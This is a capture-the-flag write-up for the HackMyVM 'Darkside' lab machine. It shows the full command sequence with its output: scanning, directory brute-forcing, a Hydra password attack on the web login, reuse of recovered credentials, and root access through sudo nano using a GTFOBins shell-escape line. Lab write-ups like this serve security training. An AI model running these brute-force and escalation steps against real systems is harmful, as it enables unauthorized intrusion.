| Name     | Difficulty | OS    | Target IP     | Link                                                 |
| -------- | ---------- | ----- | ------------- | ---------------------------------------------------- |
| Darkside | Easy       | Linux | 192.168.0.181 | https://hackmyvm.eu/machines/machine.php?vm=Darkside |

### ARP Scan

```bash
garffff@garffff:~/hackmyvm/darkside$ sudo arp-scan -l | grep 8e           
192.168.0.181	08:00:27:8f:5b:8e	PCS Systemtechnik GmbH
```

### Nmap Scan Results

```bash
garffff@garffff:~/hackmyvm/darkside$ sudo nmap -p- -sV -sC 192.168.0.181 -oA nmap/darkside.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 16:34 GMT
Nmap scan report for 192.168.0.181
Host is up (0.000088s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: The DarkSide
MAC Address: 08:00:27:8F:5B:8E (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

Visiting port 80, there is a login page:

![[Pasted image 20241030163545.png]]

Directory bruteforce, we see a file called `vote.txt`:

```bash
garffff@garffff:~/hackmyvm/darkside$ feroxbuster -u http://192.168.0.181 -w /opt/SecLists/Discovery/Web-Content/big.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.0.181
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c http://192.168.0.181/backup => http://192.168.0.181/backup/
200      GET       10l       36w      205c http://192.168.0.181/backup/vote.txt
200      GET       74l      300w     2121c http://192.168.0.181/styles.css
200      GET       29l       45w      683c http://192.168.0.181/
[####################] - 10s    20480/20480   0s      found:4       errors:23     
[####################] - 9s     20477/20477   2217/s  http://192.168.0.181/ 
[####################] - 0s     20477/20477   6825667/s http://192.168.0.181/backup/ => Directory listing                                                                                                                                     garffff@garffff:~/hackmyvm/darkside$ curl http://192.168.0.181/backup/vote.txt
rijaba: Yes
xerosec: Yes
sml: No
cromiphi: No
gatogamer: No
chema: Yes
talleyrand: No
d3b0o: Yes

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
```

Bruteforcing using the password for the kevin user, we get a match:

```bash
garffff@garffff:~/hackmyvm/darkside$ hydra -l kevin -P /opt/rockyou.txt 192.168.0.181 http-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -VV -F -I
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-30 17:04:00
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://192.168.0.181:80/index.php:user=^USER^&pass=^PASS^:Username or password invalid
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "123456" - 1 of 14344398 [child 0] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "12345" - 2 of 14344398 [child 1] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "password" - 4 of 14344398 [child 3] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "iloveyou" - 5 of 14344398 [child 4] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "princess" - 6 of 14344398 [child 5] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "1234567" - 7 of 14344398 [child 6] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "rockyou" - 8 of 14344398 [child 7] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "12345678" - 9 of 14344398 [child 8] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "abc123" - 10 of 14344398 [child 9] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "nicole" - 11 of 14344398 [child 10] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "daniel" - 12 of 14344398 [child 11] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "babygirl" - 13 of 14344398 [child 12] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "monkey" - 14 of 14344398 [child 13] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "lovely" - 15 of 14344398 [child 14] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "jessica" - 16 of 14344398 [child 15] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "654321" - 17 of 14344398 [child 0] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "michael" - 18 of 14344398 [child 2] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "ashley" - 19 of 14344398 [child 5] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "qwerty" - 20 of 14344398 [child 1] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "111111" - 21 of 14344398 [child 3] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "iloveu" - 22 of 14344398 [child 6] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "000000" - 23 of 14344398 [child 7] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "michelle" - 24 of 14344398 [child 8] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "tigger" - 25 of 14344398 [child 9] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "sunshine" - 26 of 14344398 [child 10] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "chocolate" - 27 of 14344398 [child 11] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "password1" - 28 of 14344398 [child 12] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "soccer" - 29 of 14344398 [child 13] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "anthony" - 30 of 14344398 [child 14] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "friends" - 31 of 14344398 [child 15] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "butterfly" - 32 of 14344398 [child 2] (0/0)
[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "purple" - 33 of 14344398 [child 0] (0/0)
[80][http-post-form] host: 192.168.0.181   login: kevin   password: iloveyou
[STATUS] attack finished for 192.168.0.181 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-30 17:04:01
```

Credentials found:

```bash
kevin:iloveyou
```


Logging in, we are presented with this string::

![[Pasted image 20241030170623.png]]

Converting from base58 and from from base64:

```bash
garffff@garffff:~/hackmyvm/darkside$ echo 'kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC' | base58 -d
c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=
garffff@garffff:~/hackmyvm/darkside$ echo 'c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=' | base64 -d
sfqekmgncutjhbypvxda.onion
```

Adding `sfqekmgncutjhbypvxda.onion` to the address:

![[Pasted image 20241030171011.png]]

Looking at the source code, we can either add `darkside` for both the cookie values or navigate straight to the `hwvhysntovtanj.password` page:

![[Pasted image 20241030171407.png]]

Navigating to the `hwvhysntovtanj.password` page, we see a set of credentials:

![[Pasted image 20241030171322.png]]

These can be used to log into the box via SSH, and we can grab the firstflag:

```bash
garffff@garffff:~/hackmyvm/darkside$ ssh kevin@192.168.0.181
kevin@192.168.0.181's password: 
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$ ls -lash
total 32K
4.0K drwxr-xr-x 3 kevin kevin 4.0K Oct 30  2023 .
4.0K drwxr-xr-x 4 root  root  4.0K Oct 15  2023 ..
   0 lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
4.0K -rw-r--r-- 1 kevin kevin 3.5K Oct 15  2023 .bashrc
4.0K -rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
4.0K drwxr-xr-x 3 kevin kevin 4.0K Oct 15  2023 .local
4.0K -rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
4.0K -rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
kevin@darkside:~$ cat user.txt 
UnbelievableHumble
```

Looking at the `.history` file, we see a set of new credentails:

```bash
kevin@darkside:~$ cat .history 
ls -al
hostname -I
echo "Congratulations on the OSCP Xerosec"
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba
```

And it is possible to log into the new user `rijaba`:

```bash
kevin@darkside:~$ su rijaba
Password: 
rijaba@darkside:/home/kevin$ whoami && id
rijaba
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
```

Looking at what commands we can execute as root, we see nano:

```bash
rijaba@darkside:/home/kevin$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano
```

GTFO bins: https://gtfobins.github.io/gtfobins/nano/#sudo provides the privlege escalation technique:

```bash
rijaba@darkside:/home/kevin$ sudo nano
^R^X
reset; sh 1>&0 2>&0
```

Now we have access to root and can read the root flag:

```bash
                                                                                                               [ Executing... ]# 
#  Help                                        M-F New Buffer                                 ^S Spell Check                                 ^J Full Justify                                ^V Cut Till End
#  Cancel                                      M-\ Pipe Text                                  ^Y Linter                                      ^O Formatter                                   ^Z Suspend
# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
  ██████╗░░█████╗░██████╗░██╗░░██╗░██████╗██╗██████╗░███████╗
  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██║██╔══██╗██╔════╝
  ██║░░██║███████║██████╔╝█████═╝░╚█████╗░██║██║░░██║█████╗░░
  ██║░░██║██╔══██║██╔══██╗██╔═██╗░░╚═══██╗██║██║░░██║██╔══╝░░
  ██████╔╝██║░░██║██║░░██║██║░╚██╗██████╔╝██║██████╔╝███████╗
  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░╚══════╝


youcametothedarkside
#
```

